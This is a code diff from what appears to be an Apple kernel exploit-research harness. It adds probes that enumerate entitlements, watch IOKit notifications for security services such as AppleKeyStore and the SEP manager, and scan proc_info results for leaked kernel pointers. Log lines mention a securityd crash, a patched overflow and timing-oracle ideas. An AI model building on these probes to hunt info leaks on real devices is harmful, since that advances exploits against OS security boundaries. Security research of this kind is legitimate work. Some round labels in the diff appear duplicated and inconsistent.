+                        NULL
+                    };
+                    for (int i = 0; ents[i]; i++) {
+                        CFStringRef key = CFStringCreateWithCString(NULL, ents[i], kCFStringEncodingUTF8);
+                        CFErrorRef err = NULL;
+                        CFTypeRef val = taskEnt(task, key, &err);
+                        if (val) {
+                            CFTypeID tid = CFGetTypeID(val);
+                            if (tid == CFBooleanGetTypeID()) {
+                                rlog("  ENT '%s' = %s\n", ents[i],
+                                     CFBooleanGetValue(val) ? "YES" : "NO");
+                            } else {
+                                rlog("  ENT '%s' = <type %lu>\n", ents[i], (unsigned long)tid);
+                            }
+                            CFRelease(val);
+                        }
+                        CFRelease(key);
+                    }
+                }
+
+                CFRelease(task);
+            }
+        }
+
+        /* SecCertificateCopyData — check if cert data leaks info */
+        typedef void* (*SecCertificateCreateWithData_fn)(CFAllocatorRef, CFDataRef);
+        SecCertificateCreateWithData_fn certCreate =
+            (SecCertificateCreateWithData_fn)dlsym(RTLD_DEFAULT, "SecCertificateCreateWithData");
+        rlog("  SecCertificateCreateWithData: %p\n", certCreate);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: IOKit notification probe ---- */
+    rlog("\n--- Part 3: IOKit notification registration ---\n");
+    fflush(stdout);
+    {
+        /* Register for IOKit matching notifications — when new services appear,
+           we get notified. During LDM toggle, services may be added/removed. */
+        IONotificationPortRef notifyPort = IONotificationPortCreate(kIOMainPortDefault);
+        if (notifyPort) {
+            rlog("  IONotificationPort created\n");
+
+            const char *match_classes[] = {
+                "AppleSEPManager", "AppleKeyStore", "IOSurfaceRoot",
+                "AppleCredentialManager", "AppleSPTM", "AppleUSBDevice",
+                NULL
+            };
+
+            for (int i = 0; match_classes[i]; i++) {
+                io_iterator_t iter = 0;
+                kern_return_t kr = IOServiceAddMatchingNotification(
+                    notifyPort,
+                    kIOFirstMatchNotification,
+                    IOServiceMatching(match_classes[i]),
+                    NULL, NULL, &iter);
+                if (kr == 0) {
+                    /* Drain the iterator to arm it */
+                    io_object_t obj;
+                    int cnt = 0;
+                    while ((obj = IOIteratorNext(iter)) != 0) {
+                        cnt++;
+                        IOObjectRelease(obj);
+                    }
+                    rlog("  Watching '%s': armed (existing=%d)\n", match_classes[i], cnt);
+                } else {
+                    rlog("  Watching '%s': failed kr=0x%x\n", match_classes[i], kr);
+                }
+            }
+
+            IONotificationPortDestroy(notifyPort);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: proc_info for kptr leaks ---- */
+    rlog("\n--- Part 4: proc_info queries ---\n");
+    fflush(stdout);
+    {
+        /* Try proc_pidinfo to get file descriptors — sometimes leaks kptrs */
+        pid_t pid = getpid();
+        rlog("  pid=%d\n", pid);
+
+        /* Get FD info (Mach ports are exposed through proc_info on older systems) */
+        struct proc_taskallinfo tai;
+        int ret = proc_pidinfo(pid, PROC_PIDTASKALLINFO, 0, &tai, sizeof(tai));
+        if (ret > 0) {
+            rlog("  task_allinfo: virtual_size=0x%llx resident=0x%llx\n",
+                 tai.ptinfo.pti_virtual_size, tai.ptinfo.pti_resident_size);
+            rlog("  total_user=0x%llx total_system=0x%llx\n",
+                 tai.ptinfo.pti_total_user, tai.ptinfo.pti_total_system);
+            rlog("  threads_user=0x%llx threads_system=0x%llx\n",
+                 tai.ptinfo.pti_threads_user, tai.ptinfo.pti_threads_system);
+            rlog("  pageins=%d cow_faults=%d faults=%d\n",
+                 tai.ptinfo.pti_pageins, tai.ptinfo.pti_cow_faults, tai.ptinfo.pti_faults);
+            /* Scan the entire struct for kptrs */
+            for (int i = 0; i + 8 <= (int)sizeof(tai); i += 8) {
+                uint64_t v;
+                memcpy(&v, ((uint8_t *)&tai) + i, 8);
+                if ((v >> 28) == 0xfffffffULL && v != 0xffffffffffffffffULL) {
+                    rlog("  !!! KPTR in taskallinfo @%d: 0x%llx !!!\n", i, v);
+                }
+            }
+        }
+
+        /* Get region info */
+        struct proc_regionwithpathinfo rwpi;
+        uint64_t addr = 0;
+        int region_count = 0;
+        int kptr_count = 0;
+        while (region_count < 50) {
+            ret = proc_pidinfo(pid, PROC_PIDREGIONPATHINFO, addr, &rwpi, sizeof(rwpi));
+            if (ret <= 0) break;
+
+            /* Scan for kptrs in the region info struct */
+            for (int i = 0; i + 8 <= (int)sizeof(rwpi); i += 8) {
+                uint64_t v;
+                memcpy(&v, ((uint8_t *)&rwpi) + i, 8);
+                if ((v >> 28) == 0xfffffffULL && v != 0xffffffffffffffffULL) {
+                    rlog("  !!! KPTR in regioninfo region=%d @%d: 0x%llx !!!\n",
+                         region_count, i, v);
+                    kptr_count++;
+                }
+            }
+
+            addr = rwpi.prp_prinfo.pri_address + rwpi.prp_prinfo.pri_size;
+            region_count++;
+        }
+        rlog("  Scanned %d regions, %d kptrs found\n", region_count, kptr_count);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r332 complete ===\n");
     fflush(stdout);
 }
 
@@ -42667,6 +43472,13 @@ new_modes:
             rlog("*** rounds=331: Safe Security Daemon Mach Probe ***\n");
             rlog("  r329: securityd reachable, msg send OK, crashed on rpc.\n");
             rlog("  Probe: Send-only sweep, safe rpc, SEP deep dive.\n\n");
+            r331_probe();
+            goto done;
+        }
+        if (rounds == 331) {
+            rlog("*** rounds=331: Timing Side-Channel + MTE Oracle ***\n");
+            rlog("  r330: kobject=0, host_info clean, Trigon overflow patched.\n");
+            rlog("  Probe: memory entry timing, vm_copy oracle, IOSurface timing, shared cache.\n\n");
             r331_probe();
             goto done;
         }
